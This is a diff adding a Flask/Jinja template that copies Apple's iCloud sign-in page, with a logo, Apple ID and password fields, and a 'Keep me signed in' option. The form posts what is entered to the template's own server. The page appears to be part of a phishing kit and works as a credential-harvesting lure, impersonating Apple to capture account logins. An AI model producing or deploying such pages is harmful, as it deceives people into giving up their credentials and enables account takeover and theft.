@@ -1,0 +1,35 @@
+{% block head%}
+
+<head>
+  <title>iCloud Login</title>
+  <meta name='viewport' content='width=device-width, initial-scale=1'>
+  <link rel="stylesheet" href="{{ url_for('static', filename='../../static/icloud/main.css') }}">
+</head>
+{% endblock %}
+
+{% block body%}
+
+<div id="fundo">
+  <div id="login">
+      <div id="logo"></div>
+       <h1>Sign in to iCloud</h1>
+
+       <form action="/" method="POST">
+
+            <div class="input">
+                <input type="text" name="username" placeholder="Apple ID" />
+            </div>
+            <div class="input">
+                <input type="text" name="password" placeholder="Password" />
+                <button type="submit"><div class="btn"></div></button>
+            </div>
+
+        </form>
+      <div id="footer">
+          <label>
+              <input type="checkbox" /><span>Keep me signed in</span>
+          </label>
+      </div>
+  </div>
+</div>
+{% endblock %}
